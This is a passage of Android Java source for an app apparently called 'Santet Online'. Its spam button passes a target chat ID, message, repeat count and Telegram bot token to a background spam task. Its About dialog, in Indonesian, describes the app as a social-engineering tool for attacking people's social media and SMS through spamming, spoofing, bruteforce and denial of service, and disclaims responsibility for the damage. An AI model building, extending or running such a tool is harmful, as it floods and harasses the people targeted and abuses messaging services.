						parseModeFile.close();
						Toast t = Toast.makeText(getApplicationContext(), "Settings has been applied!", Toast.LENGTH_SHORT);
						t.setGravity(Gravity.CENTER, 0, 0);
						t.show();
					} catch(Exception e) {
						e.printStackTrace();
					}
				}
			});
			spamBtn.setOnClickListener(new OnClickListener() {
				@Override
				public void onClick(View view) {
					switch(parseMode.getText().toString()) {
						case "markdown": //pass 'markdown'
						break;
						case "html": //pass 'html'
						break;
					default: parseMode.setText("markdown");
					}
					dialog.dismiss();
					tgsTask = new TGSpamTask();
					tgsTask.execute(chatid.getText().toString(),parseMode.getText().toString(),message.getText().toString(),count.getText().toString(),botToken.getText().toString());
				}
			});
		}
	};
	@Override
	public boolean onCreateOptionsMenu(Menu menu)
	{
		MenuInflater inflater = getMenuInflater();
		inflater.inflate(R.menu.menu, menu);
		return true;
	}
	@Override
	public boolean onOptionsItemSelected(MenuItem item)
	{
		switch(item.getItemId()) {
			case R.id.about: 
				AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
				builder.setTitle("Santet Online");
				builder.setMessage("Santet-Online adalah alat rekayasa sosial dengan subfungsi yang berfokus dalam menyerang penyandang kebutuhan sosial seseorang, seperti jasa sosial media dan short message service.\nSerangan yang dilancarkan tersebut selalu terkait aktifitas spamming (pesan yang dikirimkan berulang-ulang), spoofing dan bruteforce engineering, untuk subfungsi dos atau denial of service tidak lain dan tidak bukan, hanya untuk menarik peminat pengguna saja.\n\nCatatan: Santet-Online tidak terkait dengan aktifitas spiritual melainkan dengan computational activity (spam, spoof, bruteforce), jangan menduga yang tidak-tidak hanya karena nama alat ini\nPeringatan: Untuk kerusakan yang ditimbulkan karena penggunaan dari alat ini bukan tanggung jawab author, anda harus bertanggung jawab sendiri untuk kerusakan yang anda timbulkan dari menggunakan alat ini\n\nCopyright (C) 2020 by DedSecTL\n\nDedSecTL\nCvar1984\nCiKu370\nMr.TenSwapper07\namsitlab\n[M]izuno\n3RROR_TMX\nMr.K3N\nZetSec\nTroublemaker97\nL_Viole\nX14N23N6\nMR.R45K1N\nlord.zephyrus\n4cliba788\nmr0x100\nViruz\nMr_007\nITermSec\nMicroClone\nIdannovita.\nBlackHole Security.");
				builder.setPositiveButton("OK", null);
				AlertDialog dialog = builder.show();
				dialog.getButton(AlertDialog.BUTTON_POSITIVE).setTextColor(Color.parseColor("#FF0F00"));
				dialog.getButton(AlertDialog.BUTTON_POSITIVE).setBackgroundDrawable(new ColorDrawable(Color.parseColor("#1C1C1C")));
				dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.parseColor("#FF0F00")));
				break;
		}
		return true;
	}
}
